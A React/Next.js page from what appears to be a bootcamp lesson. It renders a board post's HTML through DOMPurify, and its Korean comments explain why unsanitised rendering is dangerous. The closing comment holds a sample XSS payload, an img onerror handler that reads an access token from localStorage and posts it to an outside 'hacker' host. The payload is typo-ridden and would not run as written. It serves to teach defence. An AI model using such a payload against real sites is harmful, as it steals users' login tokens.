"use client";

import { gql, useQuery } from "@apollo/client";
import DOMPurify from "dompurify";
import { useParams } from "next/navigation";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;

const StaticRoutingMovedPage = () => {
  const params = useParams();

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: params.boardId,
    },
  });

  console.log(data);

  return (
    <>
      {/* <div>상세페이지 {params.pageNum} 이동이 완료되었습니다.</div> */}
      <div>작성자 : {data && data.fetchBoard.writer}</div>
      <div>제목 : {data ? data.fetchBoard.title : ""}</div>
      {/* <div>내용 : {data?.fetchBoard.contents}</div>  */}
      {/* result: <p>qq<strong>q</strong>q</p> */}

      {/* 내용에 들어있는 태그를 문자열이 아닌 진짜 태그로 인식하기 */}
      {/* 위험하지만 보이는대로 실행해줘 */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: data?.fetchBoard.contents,
        }}
      ></div> */}

      {/* 내용이 들어있는 태그가 <script />태그처럼 공격태그가 있을 수 있으니 막아줘 */}
      <div
        dangerouslySetInnerHTML={{
          __html: DOMPurify.sanitize(data?.fetchBoard.contents),
        }}
      ></div>
    </>
  );
};

export default StaticRoutingMovedPage;

/* playground에 XSS 공격
===================================
-이미지가 없는 경우, onerror안의 함수를 실행
contents: <img src="#" onerror="
            const 훔친토큰 = localstorage.getItem("accessToken);
            fetch("http://main-hacker.codebootcamp.co.kr/token", {
              method: "post",
              header: "{"Content-Type": "applicatioin/json"},
              body: "JSON.stringify({token: 훔친토큰)}" 
            )} 
          />
===================================
*/
